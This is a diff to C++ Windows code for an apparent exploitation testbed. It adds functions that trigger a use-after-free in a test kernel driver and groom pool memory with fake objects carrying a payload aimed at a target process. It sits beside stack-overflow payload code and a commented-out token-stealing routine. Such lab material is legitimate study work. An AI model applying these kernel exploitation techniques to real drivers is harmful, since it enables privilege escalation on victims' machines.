@@ -34,7 +34,7 @@ namespace resource_functions
 	}
 } // namespace resource_functions
 
-namespace testbed {
+namespace testbed_for_exploitation {
 
 	bool TestBed::extract_driver_file(TCHAR * binFile) {
 		auto b_res = false;
@@ -115,7 +115,9 @@ namespace testbed {
 		auto b_res = false;
 		byte* input_buffer = (byte*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufferSz);
 		if (input_buffer) {
-			memset(input_buffer, /*0x49*/ (int)'I', bufferSz);
+			const char byte_sym = /*0x49*/ (int)'I';
+
+			memset(input_buffer, byte_sym, bufferSz);
 
 			/*
 			E.g.
@@ -148,6 +150,45 @@ namespace testbed {
 		} // PayloadStackOverFlow destructor
 		return b_res;
 	}
+
+	bool TestBed::run_use_after_free() {
+		auto b_res = false;
+		for (int i = 1; i < 100; i++, Sleep((rand() % 10)) ) {
+			b_res = service_manager.send_ctrl_code(TESTBED_UAF_ALLOCATE_OBJECT, NULL, 0, NULL, 0, 0);
+			
+			b_res = service_manager.send_ctrl_code(TESTBED_UAF_FREE_OBJECT, NULL, 0, NULL, 0, 0);
+			
+			print::print_mes(TEXT("user mode attempt # %d"), i);
+			
+			b_res = service_manager.send_ctrl_code(TESTBED_UAF_USE_OBJECT, NULL, 0, NULL, 0, 0);
+			
+		}
+		return b_res;
+	}
+
+	
+
+	bool TestBed::run_use_after_free_with_payload(const DWORD targetPid)
+	{
+		auto b_res = false;
+		{ // PayloadUseAfterFree constructor
+			payload_use_after_free::PayloadUseAfterFree payload_uaf(targetPid);
+			if (payload_uaf.init() &&
+				payload_uaf.prepare_memory() &&
+				service_manager.send_ctrl_code(TESTBED_UAF_ALLOCATE_OBJECT, NULL, 0, NULL, 0, 0) &&
+				service_manager.send_ctrl_code(TESTBED_UAF_FREE_OBJECT, NULL, 0, NULL, 0, 0) &&
+				payload_uaf.prepare_payload()) {
+				for (unsigned int i = 0; i < payload_uaf.poolGroomSz/2; i++) {
+					b_res = service_manager.send_ctrl_code(
+						TESTBED_UAF_ALLOCATE_FAKE, payload_uaf._buffer, 0, NULL, 0, 0);
+				}
+				b_res = service_manager.send_ctrl_code(TESTBED_UAF_USE_OBJECT, NULL, 0, NULL, 0, 0);
+			}
+		} // PayloadUseAfterFree destructor
+		
+		return b_res;
+	}
+
 } // namespace testbed 
 
 // 	void get_process_token(const char* title, const DWORD targetPid) {
